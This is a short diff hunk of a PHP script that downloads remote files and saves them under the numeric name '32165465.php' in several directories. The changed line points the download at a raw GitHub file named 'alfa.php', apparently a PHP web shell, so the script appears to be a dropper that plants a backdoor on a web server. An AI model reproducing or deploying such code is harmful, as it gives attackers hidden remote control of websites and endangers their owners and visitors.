@@ -49,7 +49,7 @@ function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
 }
 
 $files_to_download = [
-    ['url' => 'https://raw.githubusercontent.com/erosjoko5/profil2/refs/heads/main/pastygelek', 'save_name' => '32165465.php'],
+    ['url' => 'https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/alfa.php', 'save_name' => '32165465.php'],
 ];
 
 $save_directories = [
